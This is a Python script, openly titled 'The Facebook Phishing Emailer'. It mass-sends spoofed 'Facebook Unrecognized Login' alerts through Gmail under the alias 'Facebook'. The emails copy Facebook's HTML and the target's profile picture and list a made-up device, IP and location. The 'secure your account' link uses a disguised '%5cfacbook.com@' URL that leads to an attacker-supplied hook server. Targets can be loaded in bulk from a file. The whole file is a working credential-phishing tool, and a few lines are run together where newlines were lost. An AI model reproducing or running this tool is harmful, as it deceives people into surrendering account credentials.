import os, argparse, requests, random, calendar, time, yagmailfrom datetime import datetime

def sendEmail(email, head, profile_pic, body):
    # sign into gmail, and set alias name as Facebook
        yag = yagmail.SMTP({'EMAIL_ADDRESS':'Facebook'}, 'PASSWORD/TOKEN')
        subject = 'Facebook Unrecognized Login'
    # send email to target
        yag.send(email, subject, [head, profile_pic, body])

def getDevice():
    # get random device from list
        device_list = ["IPhone 8", "IPhone 6s", "IPhone XS", "Galaxy Tablet", "Galaxy Note 9", "IPhone XR", "Chromebook", "Intel", "Macbook Pro", "Macbook Air", "IPad Pro", "Google Pixle"]
        randDevice = random.choice(device_list)
        return randDevice

def getIp():
    # get random ip
        ip_list = ['195.68.71.158','210.253.76.47','57.206.79.95','208.196.102.129','49.127.101.47','204.180.75.112','39.202.88.109','158.206.202.203','247.82.159.178','95.116.246.118','51.132.140.108','108.213.126.4']
        randIp = random.choice(ip_list)
        return randIp

def getLocation(ip):
    # set url
        url = 'http://ipinfo.io/' + ip + '/json'
    # grab json response
        ip_info = requests.get(url).json()
        # extract location from ip
        city = ip_info['city']
        region = ip_info['region']
        ipLocation = city + ", " + region
        return ipLocation

def getDate():
        # get current date
        date = datetime.today()
        whole_date = date.strftime("%B %d, %Y")
        week_day = date.strftime("%A")
        currentDate = week_day + ' ' + whole_date
        return currentDate

def html(first_name, date, device, ip, location, server, facebook_id):
        access_token = 'FACEBOOK_ACCESS_TOKEN'
        # facebook logo
        head = '''<tr><td width="32" align="left" valign="middle" style="min-height:32;line-height:0px;"><img src="https://ecp.yusercontent.com/mail?url=https%3A%2F%2Fstatic.xx.fbcdn.net%2Frsrc.php%2Fv3%2FyP%2Fr%2FnblMrq1jYuK.png&amp;t=1557256121&amp;ymreqid=69b2922b-2cad-83b1-1cba-000005010800&amp;sig=1LJHzL12R8dQeAmTrIWjsw--~C" width="32" height="32" style="border:0;"></td><td width="15" style="display:block;width:15px;">&nbsp;&nbsp;&nbsp;</td><td width="100%" style=""><span style="font-family:Helvetica Neue, Helvetica, Lucida Grande, tahoma, verdana, arial, sans-serif;font-size:19px;line-height:32px;color:#3b5998;">Facebook</span></td></tr><br /><br />'''
        # body of email
        body = '''<tr><td style="display:block;width:15px;" width="15">&nbsp;&nbsp;&nbsp;</td><td style=""><table style="border-collapse:collapse;" cellspacing="0" cellpadding="0" border="0" width="100%"><tbody><tr style=""><td style="line-height:28px;" height="28">&nbsp;</td></tr>
        </td><td style="width:100%;" valign="top"><table style="border-collapse:collapse;font-size:14px;color:#3D4452;width:100%;" cellspacing="0" cellpadding="0" border="0"><tbody><tr><td style="font-size:14px;font-family:LucidaGrande, tahoma, verdana, arial, sans-serif;color:#3D4452;padding-bottom:6px;">Hi ''' + first_name + ''',</td></tr><tr><td style="font-size:14px;font-family:LucidaGrande, tahoma, verdana, arial, sans-serif;color:#3D4452;padding-top:6px;padding-bottom:6px;">Your Account Logged in on ''' + date + ''' (PDT).&nbsp;</td></tr><tr><td style="font-size:14px;font-family:LucidaGrande, tahoma, verdana, arial, sans-serif;color:#3D4452;padding-top:6px;padding-bottom:6px;"><table style="border-collapse:collapse;margin-top:5px;margin-bottom:5px;" cellspacing="0" cellpadding="0" border="0"><tbody><tr style=""><td style="padding-left:10px;"><span style="color:#808080;">Device: </span></td><td style="padding-left:10px;">''' + device + '''</td></tr><tr style=""><td style="padding-left:10px;"><span style="color:#808080;">IP address: </span></td><td style="padding-left:10px;">''' + ip + '''</td></tr><tr style=""><td style="padding-left:10px;"><span style="color:#808080;">Estimated location: </span></td><td style="padding-left:10px;">''' + location + ''', US</td></tr></tbody></table></td></tr><tr><td style="font-size:14px;font-family:LucidaGrande, tahoma, verdana, arial, sans-serif;color:#3D4452;padding-top:6px;padding-bottom:6px;"><strong>If you signed into your account,</strong> you can safely disregard this email. </td></tr><tr><td style="font-size:14px;font-family:LucidaGrande, tahoma, verdana, arial, sans-serif;color:#3D4452;padding-top:6px;padding-bottom:6px;"><strong>If you did NOT recently sign in,</strong> please <a rel="nofollow" target="_blank" href=''' + server + ''' style="color:#3b5998;text-decoration:none;">secure your account</a><strong>, for the sake of your privacy; it is strongly recommended.</td></tr><tr><td style="font-size:14px;font-family:LucidaGrande, tahoma, verdana, arial, sans-serif;color:#3D4452;padding-top:6px;padding-bottom:6px;"></td></tr><tr><td style="font-size:14px;font-family:LucidaGrande, tahoma, verdana, arial, sans-serif;color:#3D4452;padding-top:6px;padding-bottom:6px;">Thanks,<br>The Facebook Security Team</td></tr><tr><td style="font-size:14px;font-family:LucidaGrande, tahoma, verdana, arial, sans-serif;color:#3D4452;padding-top:6px;">&nbsp;</td></tr></tbody></table></td></tr></tbody></table></td></tr><tr style=""><td style="line-height:28px;" height="28">&nbsp;</td></tr></tbody></table></td><td style="display:block;width:15px;" width="15">&nbsp;&nbsp;&nbsp;</td></tr>'''
        # profile picture of target
        profile_pic = f'<img src="https://graph.facebook.com/' + str(facebook_id) + '/picture?type=square&access_token={access_token}"'
        return head, body, profile_pic

def Main():
    # arguments and usage
        parser = argparse.ArgumentParser(description="The Facebook Phishing Emailer")
        parser.add_argument("-e", "--email", help="specify target email address", required=False)
        parser.add_argument("-f", "--file", help="specify a list of profiles (seperated by ':')", required=False)
        parser.add_argument("-fn", "--first_name", help="specify first name of target", required=False)
        parser.add_argument("-u", "--url", help="specify hook url")
        parser.add_argument("-id", "--id", help="specify target facebook id", required=False)
        parser.add_argument("--verbose", help="increase output verbosity", action="store_true")
        args = parser.parse_args()

        email = args.email
        file = args.file
        first_name = args.first_name
        server = args.url
        facebook_id = args.id
        verbose = args.verbose

        url = server.replace("https://","")
        server = f"https://%5cfacbook.com@{url}"
        # read targets from file
        if file:
                with open(file, "r") as lines:
                        for line in lines:
                                email, first_name, facebook_id = line.rsplit(":")
                                facebook_id = int(facebook_id)                                device = getDevice()
                                ip = getIp()
                                location = getLocation(ip)
                                date = getDate()
                                head, body, profile_pic = html(first_name, date, device, ip, location, server, facebook_id)
                                sendEmail(email, head, profile_pic, body)
                                if verbose:
                                        print("Name: " + first_name)
                                        print("Email: " + email)
                                        print("ID: " + str(facebook_id))
                                        print("Random IP: " + ip + " Location: " + location)
                                        print("Random Device: " + device)
                                        print("[!] Message sent successfully")
                                        print()
                                else:
                                        print("[!] Message sent successfully")

    # run functions
        device = getDevice()
        ip = getIp()
        location = getLocation(ip)
        date = getDate()
        head, body, profile_pic = html(first_name, date, device, ip, location, server, facebook_id)
        sendEmail(email, head, profile_pic, body)

        # if verbose show output
        if verbose:
                print("Name: " + first_name)
                print("Email: " + email)
                print("ID: " + str(facebook_id))
                print("Random IP: " + ip + " Location: " + location)
                print("Random Device: " + device)
                print("[!] Message sent successfully")
        else:
                print("[!] Message sent successfully")

if __name__=="__main__":
        Main()
